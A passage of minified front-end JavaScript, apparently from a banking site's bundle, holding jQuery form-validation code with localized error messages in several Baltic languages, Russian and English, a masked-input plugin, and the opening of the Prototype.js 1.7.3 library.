validator.invalid[element.name],validator.showErrors()}else{var errors={},message=response||validator.defaultMessage(element,"remote");errors[element.name]=previous.message=$.isFunction(message)?message(value):message,validator.invalid[element.name]=!0,validator.showErrors(errors)}previous.valid=valid,validator.stopRequest(element,valid)}},param)),"pending"}}}),$.format=$.validator.format}(jQuery),function($){var pendingRequests={};if($.ajaxPrefilter)$.ajaxPrefilter((function(settings,_,xhr){var port=settings.port;"abort"===settings.mode&&(pendingRequests[port]&&pendingRequests[port].abort(),pendingRequests[port]=xhr)}));else{var ajax=$.ajax;$.ajax=function(settings){var mode=("mode"in settings?settings:$.ajaxSettings).mode,port=("port"in settings?settings:$.ajaxSettings).port;return"abort"===mode?(pendingRequests[port]&&pendingRequests[port].abort(),pendingRequests[port]=ajax.apply(this,arguments),pendingRequests[port]):ajax.apply(this,arguments)}}}(jQuery),function($){$.extend($.fn,{validateDelegate:function(delegate,type,handler){return this.bind(type,(function(event){var target=$(event.target);if(target.is(delegate))return handler.apply(target,arguments)}))}})}(jQuery);var validationMessages={EST:{required:"See väli peab olema täidetud.",maxlength:jQuery.validator.format("Palun sisestage vähem kui {0} tähemärki."),minlength:jQuery.validator.format("Palun sisestage vähemalt {0} tähemärki."),rangelength:jQuery.validator.format("Palun sisestage väärtus vahemikus {0} kuni {1} tähemärki."),email:"Palun sisestage korrektne e-maili aadress.",url:"Palun sisestage korrektne URL.",date:"Palun sisestage korrektne kuupäev.",dateISO:"Palun sisestage korrektne kuupäev (YYYY-MM-DD).",number:"Palun sisestage korrektne number.",digits:"Palun sisestage ainult numbreid.",equalTo:"Palun sisestage sama väärtus uuesti.",range:jQuery.validator.format("Palun sisestage väärtus vahemikus {0} kuni {1}."),max:jQuery.validator.format("Palun sisestage väärtus, mis on väiksem või võrdne arvuga {0}."),min:jQuery.validator.format("Palun sisestage väärtus, mis on suurem või võrdne arvuga {0}."),creditcard:"Palun sisestage korrektne krediitkaardi number.",time:"Palun sisestage korrektne kellaaeg."},LAT:{required:"Šis lauks ir obligāts.",remote:"Lūdzu, pārbaudiet šo lauku.",email:"Lūdzu, ievadiet derīgu e-pasta adresi.",url:"Lūdzu, ievadiet derīgu URL adresi.",date:"Lūdzu, ievadiet derīgu datumu.",dateISO:"Lūdzu, ievadiet derīgu datumu (ISO).",number:"Lūdzu, ievadiet derīgu numuru.",digits:"Lūdzu, ievadiet tikai ciparus.",creditcard:"Lūdzu, ievadiet derīgu kredītkartes numuru.",equalTo:"Lūdzu, ievadiet to pašu vēlreiz.",extension:"Lūdzu, ievadiet vērtību ar derīgu paplašinājumu.",maxlength:jQuery.validator.format("Lūdzu, ievadiet ne vairāk kā {0} rakstzīmes."),minlength:jQuery.validator.format("Lūdzu, ievadiet vismaz {0} rakstzīmes."),rangelength:jQuery.validator.format("Lūdzu ievadiet {0} līdz {1} rakstzīmes."),range:jQuery.validator.format("Lūdzu, ievadiet skaitli no {0} līdz {1}."),max:jQuery.validator.format("Lūdzu, ievadiet skaitli, kurš ir mazāks vai vienāds ar {0}."),min:jQuery.validator.format("Lūdzu, ievadiet skaitli, kurš ir lielāks vai vienāds ar {0}."),time:"Please enter a valid time."},LIT:{required:"Šis laukas yra privalomas.",remote:"Prašome pataisyti šį lauką.",email:"Prašome įvesti teisingą elektroninio pašto adresą.",url:"Prašome įvesti teisingą adresą.",date:"Prašome įvesti teisingą datą.",dateISO:"Prašome įvesti teisingą datą (ISO).",number:"Prašome įvesti teisingą skaičių.",digits:"Prašome naudoti tik skaitmenis.",creditcard:"Prašome įvesti teisingą kreditinės kortelės numerį.",equalTo:"Prašome įvestį tą pačią reikšmę dar kartą.",extension:"Prašome įvesti reikšmę su teisingu plėtiniu.",maxlength:jQuery.validator.format("Prašome įvesti ne daugiau kaip {0} simbolius(-ų)."),minlength:jQuery.validator.format("Prašome įvesti bent {0} simbolius."),rangelength:jQuery.validator.format("Prašome įvesti reikšmes, kurių ilgis nuo {0} iki {1} simbolių."),range:jQuery.validator.format("Prašome įvesti reikšmę intervale nuo {0} iki {1}."),max:jQuery.validator.format("Prašome įvesti reikšmę, mažesnę arba lygią {0}."),min:jQuery.validator.format("Prašome įvesti reikšmę, didesnę arba lygią {0}."),time:"Please enter a valid time."},RUS:{required:"Это поле необходимо заполнить.",remote:"Пожалуйста, введите правильное значение.",email:"Пожалуйста, введите корректный адрес электронной почты.",url:"Пожалуйста, введите корректный URL.",date:"Пожалуйста, введите корректную дату.",dateISO:"Пожалуйста, введите корректную дату в формате ISO.",number:"Пожалуйста, введите число.",digits:"Пожалуйста, вводите только цифры.",creditcard:"Пожалуйста, введите правильный номер кредитной карты.",equalTo:"Пожалуйста, введите такое же значение ещё раз.",extension:"Пожалуйста, выберите файл с правильным расширением.",maxlength:jQuery.validator.format("Пожалуйста, введите не больше {0} символов."),minlength:jQuery.validator.format("Пожалуйста, введите не меньше {0} символов."),rangelength:jQuery.validator.format("Пожалуйста, введите значение длиной от {0} до {1} символов."),range:jQuery.validator.format("Пожалуйста, введите число от {0} до {1}."),max:jQuery.validator.format("Пожалуйста, введите число, меньшее или равное {0}."),min:jQuery.validator.format("Пожалуйста, введите число, большее или равное {0}."),time:"Пожалуйста, введите корректное время."},ENG:{required:"This field is required",remote:"Please fix this field",email:"Please enter a valid email address",url:"Please enter a valid URL",date:"Please enter a valid date",dateISO:"Please enter a valid date (ISO)",number:"Please enter a valid number",digits:"Please enter only digits",creditcard:"Please enter a valid credit card number",equalTo:"Please enter the same value again",extension:"Please choose file with right extension",maxlength:jQuery.validator.format("Please enter no more than {0} characters"),minlength:jQuery.validator.format("Please enter at least {0} characters"),rangelength:jQuery.validator.format("Please enter a value between {0} and {1} characters long"),range:jQuery.validator.format("Please enter a value between {0} and {1}"),max:jQuery.validator.format("Please enter a value less than or equal to {0}"),min:jQuery.validator.format("Please enter a value greater than or equal to {0}"),time:"Please enter a valid time.",checkboxes:"Choose at least one",checkboxes2:"Choose at least one"}},jqueryValidator,uiValidator;function JQueryValidator(selector){return jQuery(selector).validate({ignore:":hidden,.validation-ignore",errorClass:"validation-message",errorElement:"div",errorPlacement:function(error,element){if(element.is(":checkbox, :radio"))element.parent().addClass("validation-error");else{if(element.hasClass("date-field")&&element.hasClass("validation-ignore"))return!1;if(element.parent().is(".period-selection-component")){var $div=jQuery("<div/>",{class:"validation-error"}).append(error);element.parents(".period-selection-component").after($div)}else element.parent().addClass("validation-error").append(error)}},success:function(label,element){0===jQuery(element).parent().find(".validation-message:not(:empty)").length?jQuery(element).parent().removeClass("validation-error"):jQuery(element).parent().addClass("validation-error")},highlight:function(element){jQuery(element).parent().addClass("validation-error")},unhighlight:function(element){0===jQuery(element).parent().find(".validation-message:not(:empty)").length?(jQuery(element).parent().removeClass("validation-error"),jQuery(element).next(".validation-message").remove()):jQuery(element).parent().addClass("validation-error")}})}function resolveGlobalFormValidator(form){var formToValidate=form||document.mainForm;return formToValidate?(UI.whenDOMReady((function(){if(formToValidate.classList.contains("ui-validation")&&"undefined"!=typeof SharedComponents)return uiValidator=new SharedComponents.FormValidator(formToValidate)})),formToValidate.classList.contains("jquery-form-validation")?(jQuery.extend(jQuery.validator.messages,validationMessages[Swedbank.language]),jqueryValidator=new JQueryValidator(".jquery-form-validation")):void 0):null}!function(factory){"function"==typeof define&&define.amd?define(["jquery"],factory):factory("object"==typeof exports?require("jquery"):jQuery)}((function($){var caretTimeoutId,ua=navigator.userAgent,iPhone=/iphone/i.test(ua),chrome=/chrome/i.test(ua),android=/android/i.test(ua);$.mask={definitions:{9:"[0-9]",a:"[A-Za-z]","*":"[A-Za-z0-9]"},autoclear:!0,dataName:"rawMaskFn",placeholder:"_"},$.fn.extend({caret:function(begin,end){var range;if(0!==this.length&&!this.is(":hidden"))return"number"==typeof begin?(end="number"==typeof end?end:begin,this.each((function(){this.setSelectionRange?this.setSelectionRange(begin,end):this.createTextRange&&((range=this.createTextRange()).collapse(!0),range.moveEnd("character",end),range.moveStart("character",begin),range.select())}))):(this[0].setSelectionRange?(begin=this[0].selectionStart,end=this[0].selectionEnd):document.selection&&document.selection.createRange&&(range=document.selection.createRange(),begin=0-range.duplicate().moveStart("character",-1e5),end=begin+range.text.length),{begin:begin,end:end})},unmask:function(){return this.trigger("unmask")},mask:function(mask,settings){var defs,tests,partialPosition,firstNonMaskPos,lastRequiredNonMaskPos,len,oldVal;if(!mask&&this.length>0){var fn=$(this[0]).data($.mask.dataName);return fn?fn():void 0}return settings=$.extend({autoclear:$.mask.autoclear,placeholder:$.mask.placeholder,completed:null},settings),defs=$.mask.definitions,tests=[],partialPosition=len=mask.length,firstNonMaskPos=null,$.each(mask.split(""),(function(i,c){"?"==c?(len--,partialPosition=i):defs[c]?(tests.push(new RegExp(defs[c])),null===firstNonMaskPos&&(firstNonMaskPos=tests.length-1),partialPosition>i&&(lastRequiredNonMaskPos=tests.length-1)):tests.push(null)})),this.trigger("unmask").each((function(){function tryFireCompleted(){if(settings.completed){for(var i=firstNonMaskPos;lastRequiredNonMaskPos>=i;i++)if(tests[i]&&buffer[i]===getPlaceholder(i))return;settings.completed.call(input)}}function getPlaceholder(i){return settings.placeholder.charAt(i<settings.placeholder.length?i:0)}function seekNext(pos){for(;++pos<len&&!tests[pos];);return pos}function shiftL(begin,end){var i,j;if(!(0>begin)){for(i=begin,j=seekNext(end);len>i;i++)if(tests[i]){if(!(len>j&&tests[i].test(buffer[j])))break;buffer[i]=buffer[j],buffer[j]=getPlaceholder(j),j=seekNext(j)}writeBuffer(),input.caret(Math.max(firstNonMaskPos,begin))}}function blurEvent(){checkVal(),input.val()!=focusText&&input.change()}function clearBuffer(start,end){var i;for(i=start;end>i&&len>i;i++)tests[i]&&(buffer[i]=getPlaceholder(i))}function writeBuffer(){input.val(buffer.join(""))}function checkVal(allow){var i,c,pos,test=input.val(),lastMatch=-1;for(i=0,pos=0;len>i;i++)if(tests[i]){for(buffer[i]=getPlaceholder(i);pos++<test.length;)if(c=test.charAt(pos-1),tests[i].test(c)){buffer[i]=c,lastMatch=i;break}if(pos>test.length){clearBuffer(i+1,len);break}}else buffer[i]===test.charAt(pos)&&pos++,partialPosition>i&&(lastMatch=i);return allow?writeBuffer():partialPosition>lastMatch+1?settings.autoclear||buffer.join("")===defaultBuffer?(input.val()&&input.val(""),clearBuffer(0,len)):writeBuffer():(writeBuffer(),input.val(input.val().substring(0,lastMatch+1))),partialPosition?i:firstNonMaskPos}var input=$(this),buffer=$.map(mask.split(""),(function(c,i){return"?"!=c?defs[c]?getPlaceholder(i):c:void 0})),defaultBuffer=buffer.join(""),focusText=input.val();input.data($.mask.dataName,(function(){return $.map(buffer,(function(c,i){return tests[i]&&c!=getPlaceholder(i)?c:null})).join("")})),input.one("unmask",(function(){input.off(".mask").removeData($.mask.dataName)})).on("focus.mask",(function(){var pos;input.prop("readonly")||(clearTimeout(caretTimeoutId),focusText=input.val(),pos=checkVal(),caretTimeoutId=setTimeout((function(){input.get(0)===document.activeElement&&(writeBuffer(),pos==mask.replace("?","").length?input.caret(0,pos):input.caret(pos))}),10))})).on("blur.mask",blurEvent).on("keydown.mask",(function keydownEvent(e){if(!input.prop("readonly")){var pos,begin,end,k=e.which||e.keyCode;oldVal=input.val(),8===k||46===k||iPhone&&127===k?(begin=(pos=input.caret()).begin,(end=pos.end)-begin==0&&(begin=46!==k?function seekPrev(pos){for(;--pos>=0&&!tests[pos];);return pos}(begin):end=seekNext(begin-1),end=46===k?seekNext(end):end),clearBuffer(begin,end),shiftL(begin,end-1),e.preventDefault()):13===k?blurEvent.call(this,e):27===k&&(input.val(focusText),input.caret(0,checkVal()),e.preventDefault())}})).on("keypress.mask",(function keypressEvent(e){if(!input.prop("readonly")){var p,c,next,k=e.which||e.keyCode,pos=input.caret();if(!(e.ctrlKey||e.altKey||e.metaKey||32>k)&&k&&13!==k){if(pos.end-pos.begin!=0&&(clearBuffer(pos.begin,pos.end),shiftL(pos.begin,pos.end-1)),p=seekNext(pos.begin-1),len>p&&(c=String.fromCharCode(k),tests[p].test(c))){if(function shiftR(pos){var i,c,j,t;for(i=pos,c=getPlaceholder(pos);len>i;i++)if(tests[i]){if(j=seekNext(i),t=buffer[i],buffer[i]=c,!(len>j&&tests[j].test(t)))break;c=t}}(p),buffer[p]=c,writeBuffer(),next=seekNext(p),android){setTimeout((function(){$.proxy($.fn.caret,input,next)()}),0)}else input.caret(next);pos.begin<=lastRequiredNonMaskPos&&tryFireCompleted()}e.preventDefault()}}})).on("input.mask paste.mask",(function(){window.MSInputMethodContext&&document.documentMode||input.prop("readonly")||setTimeout((function(){var pos=checkVal(!0);input.caret(pos),tryFireCompleted()}),0)})),chrome&&android&&input.off("input.mask").on("input.mask",(function androidInputEvent(){var curVal=input.val(),pos=input.caret();if(oldVal&&oldVal.length&&oldVal.length>curVal.length){for(checkVal(!0);pos.begin>0&&!tests[pos.begin-1];)pos.begin--;if(0===pos.begin)for(;pos.begin<firstNonMaskPos&&!tests[pos.begin];)pos.begin++;input.caret(pos.begin,pos.begin)}else{for(checkVal(!0);pos.begin<len&&!tests[pos.begin];)pos.begin++;input.caret(pos.begin,pos.begin)}tryFireCompleted()})),checkVal()}))}})})),Swedbank.isUiSpaEnabled||jQuery((function(){resolveGlobalFormValidator()})),SharedComponents.FormValidator.addCustomRemoteValidation=function(ruleSuffix,params,options,labelFn){resolveGlobalFormValidator();var validationRule=ruleSuffix+"Validation",customValidationRuleName="_"+validationRule,_labelFn=labelFn;uiValidator.addCustomRule(validationRule,{suffix:ruleSuffix,rule:function(elem){elem.validity[customValidationRuleName]=!1;var _params="function"==typeof params?params():params;return makeAjaxRequest(document.mainForm,_params,(function(response){var responseJSON=response.responseJSON;200!==response.status||responseJSON.exception||responseJSON.errors.length?(elem.validity[customValidationRuleName]=!1,elem.setCustomValidity(_labelFn(responseJSON.errors[0])),uiValidator.addForcedErrorForElement(elem,_labelFn(responseJSON.errors[0]),"customError")):(elem.validity[customValidationRuleName]=!0,elem.setCustomValidity(""))}),options),elem.validity[customValidationRuleName]}.bind(uiValidator)})};var Prototype={Version:"1.7.3",Browser:function(){var ua=navigator.userAgent,isOpera="[object Opera]"==Object.prototype.toString.call(window.opera);return{IE:!!window.attachEvent&&!isOpera,Opera:isOpera,WebKit:ua.indexOf("AppleWebKit/")>-1,Gecko:ua.indexOf("Gecko")>-1&&-1===ua.indexOf("KHTML"),MobileSafari:/Apple.*Mobile/.test(ua)}}(),BrowserFeatures:{XPath:!!document.evaluate,SelectorsAPI:!!document.querySelector,ElementExtensions:function(){var constructor=window.Element||window.HTMLElement;return!(!constructor||!constructor.prototype)}(),SpecificElementExtensions:function(){if(void 0!==window.HTMLDivElement)return!0;var div=document.createElement("div"),form=document.createElement("form"),isSupported=!1;return div.__proto__&&div.__proto__!==form.__proto__&&(isSupported=!0),div=form=null,isSupported}()},ScriptFragment:"<script[^>]*>([\\S\\s]*?)</script\\s*>",JSONFilter:/^\/\*-secure-([\s\S]*)\*\/\s*$/,emptyFunction:function(){},K:function(x){return x}};Prototype.Browser.MobileSafari&&(Prototype.BrowserFeatures.SpecificElementExtensions=!1);var Class=function(){var IS_DONTENUM_BUGGY=function(){for(var p in{toString:1})if("toString"===p)return!1;return!0}();function subclass(){}return{create:function create(){var parent=null,properties=$A(arguments);function klass(){this.initialize.apply(this,arguments)}Object.isFunction(properties[0])&&(parent=properties.shift()),Object.extend(klass,Class.Methods),klass.superclass=parent,klass.subclasses=[],parent&&(subclass.prototype=parent.prototype,klass.prototype=new subclass,parent.subclasses.push(klass));for(var i=0,length=properties.length;i<length;i++)klass.addMethods(properties[i]);return klass.prototype.initialize||(klass.prototype.initialize=Prototype.emptyFunction),klass.prototype.constructor=klass,klass},Methods:{addMethods:function addMethods(source){var ancestor=this.superclass&&this.superclass.prototype,properties=Object.keys(source);IS_DONTENUM_BUGGY&&(source.toString!=Object.prototype.toString&&properties.push("toString"),source.valueOf!=Object.prototype.valueOf&&properties.push("valueOf"));for(var i=0,length=properties.length;i<length;i++){var property=properties[i],value=source[property];if(ancestor&&Object.isFunction(value)&&"$super"==value.argumentNames()[0]){var method=value;value=function(m){return function(){return ancestor[m].apply(this,arguments)}}(property).wrap(method),value.valueOf=function(method){return function(){return method.valueOf.call(method)}}(method),value.toString=function(method){return function(){return method.toString.call(method)}}(method)}this.prototype[property]=value}return this}}}}();!function(){var _toString=Object.prototype.toString,_hasOwnProperty=Object.prototype.hasOwnProperty,NULL_TYPE="Null",UNDEFINED_TYPE="Undefined",BOOLEAN_TYPE="Boolean",NUMBER_TYPE="Number",STRING_TYPE="String",OBJECT_TYPE="Object",BOOLEAN_CLASS="[object Boolean]",NUMBER_CLASS="[object Number]",STRING_CLASS="[object String]",ARRAY_CLASS="[object Array]",NATIVE_JSON_STRINGIFY_SUPPORT=window.JSON&&"function"==typeof JSON.stringify&&"0"===JSON.stringify(0)&&void 0===JSON.stringify(Prototype.K),DONT_ENUMS=["toString","toLocaleString","valueOf","hasOwnProperty","isPrototypeOf","propertyIsEnumerable","constructor"],IS_DONTENUM_BUGGY=function(){for(var p in{toString:1})if("toString"===p)return!1;return!0}();function Type(o){switch(o){case null:return NULL_TYPE;case void 0:return UNDEFINED_TYPE}switch(typeof o){case"boolean":return BOOLEAN_TYPE;case"number":return NUMBER_TYPE;case"string":return STRING_TYPE}return OBJECT_TYPE}function extend(destination,source){for(var property in source)destination[property]=source[property];return destination}function Str(key,holder,stack){var value=holder[key];Type(value)===OBJECT_TYPE&&"function"==typeof value.toJSON&&(value=value.toJSON(key));var _class=_toString.call(value);switch(_class){case NUMBER_CLASS:case BOOLEAN_CLASS:case STRING_CLASS:value=value.valueOf()}switch(value){case null:return"null";case!0:return"true";case!1:return"false"}switch(typeof value){case"string":return value.inspect(!0);case"number":return isFinite(value)?String(value):"null";case"object":for(var i=0,length=stack.length;i<length;i++)if(stack[i]===value)throw new TypeError("Cyclic reference to '"+value+"' in object");stack.push(value);var partial=[];if(_class===ARRAY_CLASS){for(i=0,length=value.length;i<length;i++){var str=Str(i,value,stack);partial.push(void 0===str?"null":str)}partial="["+partial.join(",")+"]"}else{var keys=Object.keys(value);for(i=0,length=keys.length;i<length;i++){void 0!==(str=Str(key=keys[i],value,stack))&&partial.push(key.inspect(!0)+":"+str)}partial="{"+partial.join(",")+"}"}return stack.pop(),partial}}function isArray(object){return _toString.call(object)===ARRAY_CLASS}function isUndefined(object){return void 0===object}"function"==typeof Array.isArray&&Array.isArray([])&&!Array.isArray({})&&(isArray=Array.isArray),extend(Object,{extend:extend,inspect:function inspect(object){try{return isUndefined(object)?"undefined":null===object?"null":object.inspect?object.inspect():String(object)}catch(e){if(e instanceof RangeError)return"...";throw e}},toJSON:NATIVE_JSON_STRINGIFY_SUPPORT?function stringify(object){return JSON.stringify(object)}:function toJSON(value){return Str("",{"":value},[])},toQueryString:function toQueryString(object){return $H(object).toQueryString()},toHTML:function toHTML(object){return object&&object.toHTML?object.toHTML():String.interpret(object)},keys:Object.keys||function keys(object){if(Type(object)!==OBJECT_TYPE)throw new TypeError;var results=[];for(var property in object)_hasOwnProperty.call(object,property)&&results.push(property);if(IS_DONTENUM_BUGGY)for(var i=0;property=DONT_ENUMS[i];i++)_hasOwnProperty.call(object,property)&&results.push(property);return results},values:function values(object){var results=[];for(var property in object)results.push(object[property]);return results},clone:function clone(object){return extend({},object)},isElement:function isElement(object){return!(!object||1!=object.nodeType)},isArray:isArray,isHash:function isHash(object){return object instanceof Hash},isFunction:function isFunction(object){return"[object Function]"===_toString.call(object)},isString:function isString(object){return _toString.call(object)===STRING_CLASS},isNumber:function isNumber(object){return _toString.call(object)===NUMBER_CLASS},isDate:function isDate(object){return"[object Date]"===_toString.call(object)},isUndefined:isUndefined})}(),Object.extend(Function.prototype,function(){var slice=Array.prototype.slice;function update(array,args){for(var arrayLength=array.length,length=args.length;length--;)array[arrayLength+length]=args[length];return array}function merge(array,args){return update(array=slice.call(array,0),args)}var extensions={argumentNames:function argumentNames(){var names=this.toString().match(/^[\s\(]*function[^(]*\(([^)]*)\)/)[1].replace(/\/\/.*?[\r\n]|\/\*(?:.|[\r\n])*?\*\//g,"").replace(/\s+/g,"").split(",");return 1!=names.length||names[0]?names:[]},bindAsEventListener:function bindAsEventListener(context){var __method=this,args=slice.call(arguments,1);return function(event){var a=update([event||window.event],args);return __method.apply(context,a)}},curry:function curry(){if(!arguments.length)return this;var __method=this,args=slice.call(arguments,0);return function(){var a=merge(args,arguments);return __method.apply(this,a)}},delay:function delay(timeout){var __method=this,args=slice.call(arguments,1);return timeout*=1e3,window.setTimeout((function(){return __method.apply(__method,args)}),timeout)},defer:function defer(){var args=update([.01],arguments);return this.delay.apply(this,args)},wrap:function wrap(wrapper){var __method=this;return function(){var a=update([__method.bind(this)],arguments);return wrapper.apply(this,a)}},methodize:function methodize(){if(this._methodized)return this._methodized;var __method=this;return this._methodized=function(){var a=update([this],arguments);return __method.apply(null,a)}}};return Function.prototype.bind||(extensions.bind=function bind(context){if(arguments.length<2&&Object.isUndefined(arguments[0]))return this;if(!Object.isFunction(this))throw new TypeError("The object is not callable.");var nop=function(){},__method=this,args=slice.call(arguments,1),bound=function(){var a=merge(args,arguments),c=this instanceof bound?this:context;return __method.apply(c,a)};return nop.prototype=this.prototype,bound.prototype=new nop,bound}),extensions}()),function(proto){proto.toISOString||(proto.toISOString=function toISOString(){return this.getUTCFullYear()+"-"+(this.getUTCMonth()+1).toPaddedString(2)+"-"+this.getUTCDate().toPaddedString(2)+"T"+this.getUTCHours().toPaddedString(2)+":"+this.getUTCMinutes().toPaddedString(2)+":"+this.getUTCSeconds().toPaddedString(2)+"Z"}),proto.toJSON||(proto.toJSON=function toJSON(){return this.toISOString()})}(Date.prototype),RegExp.prototype.match=RegExp.prototype.test,RegExp.escape=function(str){return String(str).replace(/([.*+?^=!:${}()|[\]\/\\])/g,"\\$1")};var PeriodicalExecuter=Class.create({initialize:function(callback,frequency){this.callback=callback,this.frequency=frequency,this.currentlyExecuting=!1,this.registerCallback()},registerCallback:function(){this.timer=setInterval(this.onTimerEvent.bind(this),1e3*this.frequency)},execute:function(){this.callback(this)},stop:function(){this.timer&&(clearInterval(this.timer),this.timer=null)},onTimerEvent:function(){if(!this.currentlyExecuting)try{this.currentlyExecuting=!0,this.execute(),this.currentlyExecuting=!1}catch(e){throw this.currentlyExecuting=!1,e}}});Object.extend(String,{interpret:function(value){return null==value?"":String(value)},specialChar:{"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r","\\":"\\\\"}}),Object.extend(String.prototype,function(){var NATIVE_JSON_PARSE_SUPPORT=window.JSON&&"function"==typeof JSON.parse&&JSON.parse('{"test": true}').test;function prepareReplacement(replacement){if(Object.isFunction(replacement))return replacement;var template=new Template(replacement);return function(match){return template.evaluate(match)}}function isNonEmptyRegExp(regexp){return regexp.source&&"(?:)"!==regexp.source}function gsub(pattern,replacement){var match,result="",source=this;if(replacement=prepareReplacement(replacement),Object.isString(pattern)&&(pattern=RegExp.escape(pattern)),!pattern.length&&!isNonEmptyRegExp(pattern))return(replacement=replacement(""))+source.split("").join(replacement)+replacement;for(;source.length>0;)(match=source.match(pattern))&&match[0].length>0?(result+=source.slice(0,match.index),result+=String.interpret(replacement(match)),source=source.slice(match.index+match[0].length)):(result+=source,source="");return result}function sub(pattern,replacement,count){return replacement=prepareReplacement(replacement),count=Object.isUndefined(count)?1:count,this.gsub(pattern,(function(match){return--count<0?match[0]:replacement(match)}))}function scan(pattern,iterator){return this.gsub(pattern,iterator),String(this)}function truncate(length,truncation){return length=length||30,truncation=Object.isUndefined(truncation)?"...":truncation,this.length>length?this.slice(0,length-truncation.length)+truncation:String(this)}function strip(){return this.replace(/^\s+/,"").replace(/\s+$/,"")}function stripTags(){return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?(\/)?>|<\/\w+>/gi,"")}function stripScripts(){return this.replace(new RegExp(Prototype.ScriptFragment,"img"),"")}function extractScripts(){var matchAll=new RegExp(Prototype.ScriptFragment,"img"),matchOne=new RegExp(Prototype.ScriptFragment,"im");return(this.match(matchAll)||[]).map((function(scriptTag){return(scriptTag.match(matchOne)||["",""])[1]}))}function evalScripts(){return this.extractScripts().map((function(script){return eval(script)}))}function escapeHTML(){return this.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}function unescapeHTML(){return this.stripTags().replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&")}function toQueryParams(separator){var match=this.strip().match(/([^?#]*)(#.*)?$/);return match?match[1].split(separator||"&").inject({},(function(hash,pair){if((pair=pair.split("="))[0]){var key=decodeURIComponent(pair.shift()),value=pair.length>1?pair.join("="):pair[0];null!=value&&(value=value.gsub("+"," "),value=decodeURIComponent(value)),key in hash?(Object.isArray(hash[key])||(hash[key]=[hash[key]]),hash[key].push(value)):hash[key]=value}return hash})):{}}function toArray(){return this.split("")}function succ(){return this.slice(0,this.length-1)+String.fromCharCode(this.charCodeAt(this.length-1)+1)}function times(count){return count<1?"":new Array(count+1).join(this)}function camelize(){return this.replace(/-+(.)?/g,(function(match,chr){return chr?chr.toUpperCase():""}))}function capitalize(){return this.charAt(0).toUpperCase()+this.substring(1).toLowerCase()}function underscore(){return this.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/-/g,"_").toLowerCase()}function dasherize(){return this.replace(/_/g,"-")}function inspect(useDoubleQuotes){var escapedString=this.replace(/[\x00-\x1f\\]/g,(function(character){return character in String.specialChar?String.specialChar[character]:"\\u00"+character.charCodeAt().toPaddedString(2,16)}));return useDoubleQuotes?'"'+escapedString.replace(/"/g,'\\"')+'"':"'"+escapedString.replace(/'/g,"\\'")+"'"}function unfilterJSON(filter){return this.replace(filter||Prototype.JSONFilter,"$1")}function isJSON(){var str=this;return!str.blank()&&(str=(str=(str=str.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@")).replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]")).replace(/(?:^|:|,)(?:\s*\[)+/g,""),/^[\],:{}\s]*$/.test(str))}function evalJSON(sanitize){var json=this.unfilterJSON(),cx=/[\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff\u0000]/g;cx.test(json)&&(json=json.replace(cx,(function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})));try{if(!sanitize||json.isJSON())return eval("("+json+")")}catch(e){}throw new SyntaxError("Badly formed JSON string: "+this.inspect())}function parseJSON(){var json=this.unfilterJSON();return JSON.parse(json)}function include(pattern){return this.indexOf(pattern)>-1}function startsWith(pattern,position){return position=Object.isNumber(position)?position:0,this.lastIndexOf(pattern,position)===position}function endsWith(pattern,position){pattern=String(pattern),(position=Object.isNumber(position)?position:this.length)<0&&(position=0),position>this.length&&(position=this.length);var d=position-pattern.length;return d>=0&&this.indexOf(pattern,d)===d}function empty(){return""==this}function blank(){return/^\s*$/.test(this)}function interpolate(object,pattern){return new Template(this,pattern).evaluate(object)}return{gsub:gsub,sub:sub,scan:scan,truncate:truncate,strip:String.prototype.trim||strip,stripTags:stripTags,stripScripts:stripScripts,extractScripts:extractScripts,evalScripts:evalScripts,escapeHTML:escapeHTML,unescapeHTML:unescapeHTML,toQueryParams:toQueryParams,parseQuery:toQueryParams,toArray:toArray,succ:succ,times:times,camelize:camelize,capitalize:capitalize,underscore:underscore,dasherize:dasherize,inspect:inspect,unfilterJSON:unfilterJSON,isJSON:isJSON,evalJSON:NATIVE_JSON_PARSE_SUPPORT?parseJSON:evalJSON,include:include,startsWith:String.prototype.startsWith||startsWith,endsWith:String.prototype.endsWith||endsWith,empty:empty,blank:blank,interpolate:interpolate}}());var Template=Class.create({initialize:function(template,pattern){this.template=template.toString(),this.pattern=pattern||Template.Pattern},evaluate:function(object){return object&&Object.isFunction(object.toTemplateReplacements)&&(object=object.toTemplateReplacements()),this.template.gsub(this.pattern,(function(match){if(null==object)return match[1]+"";var before=match[1]||"";if("\\"==before)return match[2];var ctx=object,expr=match[3],pattern=/^([^.[]+|\[((?:.*?[^\\])?)\])(\.|\[|$)/;if(null==(match=pattern.exec(expr)))return before;for(;null!=match;){if(null==(ctx=ctx[match[1].startsWith("[")?match[2].replace(/\\\\]/g,"]"):match[1]])||""==match[3])break;expr=expr.substring("["==match[3]?match[1].length:match[0].length),match=pattern.exec(expr)}return before+String.interpret(ctx)}))}});Template.Pattern=/(^|.|\r|\n)(#\{(.*?)\})/;var $break={},Enumerable=function(){function all(iterator,context){iterator=iterator||Prototype.K;var result=!0;return this.each((function(value,index){if(!(result=result&&!!iterator.call(context,value,index,this)))throw $break}),this),result}function any(iterator,context){iterator=iterator||Prototype.K;var result=!1;return this.each((function(value,index){if(result=!!iterator.call(context,value,index,this))throw $break}),this),result}function collect(iterator,context){iterator=iterator||Prototype.K;var results=[];return this.each((function(value,index){results.push(iterator.call(context,value,index,this))}),this),results}function detect(iterator,context){var result;return this.each((function(value,index){if(iterator.call(context,value,index,this))throw result=value,$break}),this),result}function findAll(iterator,context){var results=[];return this.each((function(value,index){iterator.call(context,value,index,this)&&results.push(value)}),this),results}function include(object){if(Object.isFunction(this.indexOf)&&-1!=this.indexOf(object))return!0;var found=!1;return this.each((function(value){if(value==object)throw found=!0,$break})),found}function toArray(){return this.map()}return{each:function each(iterator,context){try{this._each(iterator,context)}catch(e){if(e!=$break)throw e}return this},eachSlice:function eachSlice(number,iterator,context){var index=-number,slices=[],array=this.toArray();if(number<1)return 